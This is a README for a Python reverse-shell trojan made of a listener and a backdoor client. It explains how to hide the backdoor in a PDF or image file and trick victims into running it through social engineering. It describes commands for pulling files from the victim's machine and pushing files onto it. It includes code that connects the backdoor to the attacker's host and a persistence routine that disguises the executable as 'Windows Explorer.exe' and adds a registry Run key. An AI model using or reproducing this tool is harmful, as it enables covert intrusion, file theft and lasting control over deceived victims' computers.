# Python Reverse Shell For Trojan
Runs a reverse shell via TCP with capacity of download and upload any file from your machine to the victim's machine and vice versa. You can hide it in a simple file (like a pdf), and using reverse engineering, you can to get the person you send file to run the program believing that this is a normal pdf (or another) file.
The tool consists of two files: listener.py and reverse_shell.py.
## listener.py
Runs a TCP server in the attacker's machine and goes into listening mode, waiting for the connection from victim's machine.
### Usage:
`python3 listener.py [OPTIONS]`
### Flags:
- **-i, --ip:** Ip address to listening
- **-p, --p:** Port number to listening
- **-h, --help:** Show list of commands

### Commands:
Once the victim has connected to our server, we can run the commands from his machine like a normal reverse shell, but also, this tool has 4 own commands:
- **exit, Exit:** Finishes client-server connection.
- **down:** Download any file from client's side to our machine. The structure has to be down + [dest_path] + [file_name]. 
Example:
`$down /home/user/Documents/ file.txt`
Where [dest_path] is the route where we want to download the file **(don't add a file name here, just the path)**, and [file_name] is the name of the file in the victim's machine. The tool will use [file_name] to name the downloaded file.
- **up:** Up any file from our machine to the victim's machine. The structure has to be up + [dest_path] + [file_name].
Example:
`$up /home/victim_folder/Desktop/folder/ /home/our_user/file.txt`

## reverse_shell.py
Connects via TCP to listener server.  It runs once a person opens it; you can hide it in a pdf file, png, jpg, etc. Use your social engineering skills to deceive people to open it ;).
### Configuration
At the end of the code, set the ip and port where to establish the connection:
```python
try: 
    backdoor = Backdoor('<ip>', <port>) # CHANGE HOST AND PORT HERE!
    backdoor.run()
except:
    sys.exit()
```
The ip and port have to be the same as you set in 'listener.py', because this is where connection will be established.
### Persistent mode
```python
def becomePersistent(self):
        fileLocation = os.environ['appdata'] + '\\Windows Explorer.exe'
        if not os.path.exists(fileLocation):
            shutil.copyfile(sys.executable, fileLocation)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + fileLocation + '"', shell=True)
```



